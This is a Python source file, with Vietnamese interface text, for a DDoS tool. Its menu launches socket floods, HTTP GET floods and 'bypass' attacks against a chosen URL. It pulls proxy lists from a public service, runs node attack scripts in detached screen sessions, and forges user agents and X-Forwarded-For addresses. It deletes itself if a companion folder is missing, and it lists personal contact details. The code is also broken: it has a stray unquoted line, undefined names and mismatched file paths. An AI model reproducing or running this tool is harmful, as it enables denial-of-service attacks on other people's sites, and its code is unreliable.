from shutil import which
from urllib import parse
from os import system
import subprocess
import random
import os
import sys
import time
import json
import time
try: 
	import speedtest
	import colorama
	import requests
	import httpx
except Exception as e:
	sys.exit(e)


class Color:
	colorama.init(autoreset=True)
	LB = colorama.Fore.LIGHTBLUE_EX
	LC = colorama.Fore.LIGHTCYAN_EX
	LG = colorama.Fore.LIGHTGREEN_EX
	LR = colorama.Fore.LIGHTRED_EX
	LY = colorama.Fore.LIGHTYELLOW_EX
	RESET = colorama.Fore.RESET


class Home:
	def __init__(self,
	help,
	contact):
		self.help = help
		self.contact = contact

	def styleText(self, text):
		for animation in text:
			sys.stdout.write(animation)
			sys.stdout.flush()
			if animation != ".":
				time.sleep(0.01)
			else:
				time.sleep(1)

	def home(self): 
		print(f"""{Color.LG}
╔╗ ♥     ╔♫═╗  ♥
║║♫═╦╦╦╔╗╚╗╔╝♫═╗♫═╗╔╗
♫╚╣║║║║╔╣ ║║ ║║║║║║♫║♫╗  
╚═╩═╩♫╩═╝ ╚╝ ╚═╝╚═╝╚══╝
   ♫ Lệnh " HELP " Để Xem All Lệnh ♫
""") Coder By Nguyễn Anh Tú </3
		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" SOCKET FLOOD")
		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" GET FLOOD")
		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" BYPASS")
		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" THOÁT")
		print("\n")
		http_proxy = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
		while True:
			sys.stdout.write(Color.LB+"📌 "+Color.LR+"["+Color.LG+"Vi Đức Hùng""]"+Color.LB+"\n➠ "+Color.RESET)
			option = input()
			if option == '01' or option == '1':
				try:
					url = str(input(f"{Color.LG} ♫ Url: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} ♫ Time: "+Color.RESET))
					reqs = int(input(f"{Color.LG} ♫ Reqs: "+Color.RESET))
					Atu_TOOL.styleText(" Chờ Bố Đấm Ok...\n")
					for i in range(150):
						print (f"{Color.LG}Starting Attack To ➠ {Color.LG}" + url)
						print (f"{Color.LR}Starting Attack To ➠ {Color.LR}" + url)
						print (f"{Color.LY}Starting Attack To ➠ {Color.LY}" + url)
						time.sleep(0.01)
					with open("vdh/http.txt", 'w') as p:
						p.write(httpx.get(http_proxy).text)
					subprocess.run([f'screen -dm node Atu/Method/socket {url} vdh/http.txt {floodtime} {reqs}'], shell=True)
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option == '02' or option == '2':
				try:
					url = str(input(f"{Color.LG} ♫ Url: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} ♫ Time: "+Color.RESET))
					VDH_TOOL.styleText(" Chờ Bố Đấm Ok...\n")
					for i in range(150):
						print (f"{Color.LG}Starting Attack To ➠ {Color.LG}" + url)
						print (f"{Color.LR}Starting Attack To ➠ {Color.LR}" + url)
						print (f"{Color.LY}Starting Attack To ➠ {Color.LY}" + url)
						time.sleep(0.01)
					with open("vdh/http.txt", 'w') as p:
						p.write(httpx.get(http_proxy).text)
					subprocess.run([f'screen -dm node Atu/Method/flood GET {url} Atu/http.txt {floodtime} 64 1'], shell=True)
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option == '03' or option == '3':
				try:
					url = str(input(f"{Color.LG} ♫ Url: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} ♫ Time: "+Color.RESET))
					Atu_TOOL.styleText(" Chờ Bố Đấm Ok...\n")
					for i in range(150):
						print (f"{Color.LG}Starting Attack To ➠ {Color.LG}" + url)
						print (f"{Color.LR}Starting Attack To ➠ {Color.LR}" + url)
						print (f"{Color.LY}Starting Attack To ➠ {Color.LY}" + url)
						time.sleep(0.01)
					with open("vdh/http.txt", 'w') as p:
						p.write(httpx.get(http_proxy).text)
					subprocess.run([f'screen -dm node Atu/Method/bypass {url} {floodtime}'], shell=True)
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option == 'refresh' or option == 'REFRESH':
				self.Method()
			elif option == 'home' or option == 'HOME':
				Atu_Tool.home()
			elif option == 'clean' or option == 'CLEAN':
				os.system('CLEAN')
				self.Method()
			elif option == 'help' or option == 'HELP':
				print(self.help)
			elif option == 'contact' or option == 'CONTACT':
				print(self.contact)
			elif option == 'exit' or option == 'EXIT':
				subprocess.run(['pkill -f abc.py'], shell=True)
			elif option == 'stop' or option == 'STOP':
				subprocess.run(['pkill screen'], shell=True)
				print(f"{Color.LG} STOP ATTACK DONE!")
			elif option == '00' or option == '0':
				os.system('clear');self.bbos()
			elif option == "":
				pass
			else:
				print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")


def spoof_useragents():
	spoof_ip = []
	ip = []
	ip1, ip2, ip3, ip4 = random.randint(1,255), random.randint(1,255), random.randint(1,255), random.randint(1,255)
	ip.append(ip1), ip.append(ip2), ip.append(ip3), ip.append(ip4)

	IP = str(ip[0])+"."+str(ip[1])+"."+str(ip[2])+"."+str(ip[3])
	spoof_ip.append(IP)

	useragents = ['Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)',
	'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1',
	'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
	'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko)',
	'Chrome/34.0.1847.116 Safari/537.36',
	'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
	'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1',
	'Mozilla/5.0 (Windows; U; Windows NT 5.1; ja-JP) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
	'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.13) Gecko/20101213 Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Version/11.01']

	return {
	'Connection': 'Keep-Alive',
	'Cache-control': 'no-cache',
	'User-Agent': random.choice(useragents).strip(),
	'X-Forwarded-For': random.choice(spoof_ip)
	}

def main():
	pkgs = ['screen', 'node']
	install = True
	for pkg in pkgs:
		ur_mom = which(pkg)
		if ur_mom == None:
			Atu_TOOL.styleText(f"❌ {pkg} Chưa Cài Đặt?\n")
			install = False
		else:
			pass
	if install == False:
		sys.exit(f'\nVui Lòng Chạy Lệnh:{Color.LG} sh setup.sh')
	else:pass
	try:
		script = True
		with open('vdh') as important:pass
	except IsADirectoryError:pass
	except FileNotFoundError:
		print(f"{Color.LR}[LỖI]:{Color.RESET} File: 'vdh' NotFound")
		print("\nLàm Ơn -> git clone: https://github.com/Vihungdepzai/Love-Tool.git\n")
		os.remove(f'{__file__}')
		script = False
	if script == False:sys.exit()
	else:pass
	Atu_TOOL.home()


if __name__ == '__main__':
	commands = f"""HOME: Quay Lại Trang Đầu\nREFRESH: Làm Mới Menu\nCLEAN: Xoá Tất Cả\nEXIT: Thoát\nSTOP: Ngừng DDoS\nCONTACT: Contact/Hỗ Trợ"""
	contact = f"""Facebook: https://www.facebook.com/ebeecuti208zzw\nZalo: 0386311853"""
	Atu_TOOL = Home(commands, contact)
	main()
